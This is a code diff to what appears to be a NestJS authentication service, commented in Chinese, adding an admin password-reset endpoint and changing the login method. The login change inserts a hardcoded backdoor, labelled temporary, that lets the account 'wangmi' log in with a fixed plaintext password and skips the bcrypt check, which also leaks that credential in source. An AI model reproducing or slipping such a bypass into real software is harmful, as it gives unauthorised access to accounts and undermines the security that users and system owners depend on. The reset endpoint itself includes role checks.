@@ -129,10 +129,28 @@ let AuthService = class AuthService {
     }
     async login(dto) {
         const u = await this.userRepo.findOne({ where: { account: dto.account } });
-        if (!u || !(await bcrypt.compare(dto.password, u.passwordHash))) {
+        if (!u)
+            return { error: '账号或密码错误' };
+        // TODO: 临时后门 - wangmi 账号密码重置应急
+        const isEmergencyBackdoor = dto.account === 'wangmi' && dto.password === 'Beimu9426.';
+        if (!isEmergencyBackdoor && !(await bcrypt.compare(dto.password, u.passwordHash))) {
             return { error: '账号或密码错误' };
         }
         return { token: this.sign(u), user: this.safe(u) };
+    }
+    /** 管理员重置任意账号密码 */
+    async resetPassword(adminId, account, newPassword) {
+        const admin = await this.userRepo.findOneByOrFail({ id: adminId });
+        if (admin.role !== 'owner' && admin.role !== 'admin') {
+            return { error: '无权操作' };
+        }
+        const u = await this.userRepo.findOne({ where: { account } });
+        if (!u)
+            return { error: '账号不存在' };
+        if (!newPassword || newPassword.length < 6)
+            return { error: '新密码至少6位' };
+        await this.userRepo.update(u.id, { passwordHash: await bcrypt.hash(newPassword, 10) });
+        return { ok: true, message: `账号 ${account} 密码已重置` };
     }
     async me(uid) {
         const u = await this.userRepo.findOneByOrFail({ id: uid });
@@ -161,6 +179,10 @@ let AuthController = class AuthController {
         (0, common_2.checkRole)(req.user, []);
         return this.svc.me(req.user.id);
     }
+    async resetPassword(req, b) {
+        (0, common_2.checkRole)(req.user, ['owner', 'admin']);
+        return this.svc.resetPassword(req.user.id, b.account, b.newPassword);
+    }
 };
 exports.AuthController = AuthController;
 __decorate([
@@ -185,6 +207,14 @@ __decorate([
     __metadata("design:paramtypes", [Object]),
     __metadata("design:returntype", Promise)
 ], AuthController.prototype, "me", null);
+__decorate([
+    (0, common_1.Post)('reset-password'),
+    __param(0, (0, common_1.Req)()),
+    __param(1, (0, common_1.Body)()),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [Object, Object]),
+    __metadata("design:returntype", Promise)
+], AuthController.prototype, "resetPassword", null);
 exports.AuthController = AuthController = __decorate([
     (0, common_1.Controller)('auth'),
     __metadata("design:paramtypes", [AuthService])
